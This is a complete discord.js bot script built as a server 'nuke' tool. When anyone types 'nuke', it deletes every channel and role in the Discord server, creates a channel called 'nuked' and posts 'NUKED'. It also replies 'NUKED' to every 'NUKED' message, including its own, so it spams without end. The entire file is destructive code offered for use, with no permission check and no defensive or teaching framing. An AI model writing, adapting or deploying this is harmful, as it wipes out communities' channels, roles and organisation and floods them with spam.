const Token ="your bots token here!";
const Discord = require("discord.js"); 
const Client = new Discord.Client({
   intents: [
      Discord.Intents.FLAGS.GUILDS,
      Discord.Intents.FLAGS.GUILD_MESSAGES
   ]
});


Client.on('message', async (message) => {
    if (message.content == 'nuke') {
       message.guild.channels.cache.forEach(channel => channel.delete());
          
       message.guild.roles.cache.forEach(role => role.delete());

       
       await message.guild.channels.create("nuked", {
          type : "text"
       }).then(async channel=> {
          channel.send("NUKED")
       })
    }
 })


 Client.on("message", async (message) => {
    if (message.content == "NUKED") {
       message.channel.send("NUKED")
    }
 })
 
Client.login(Token);
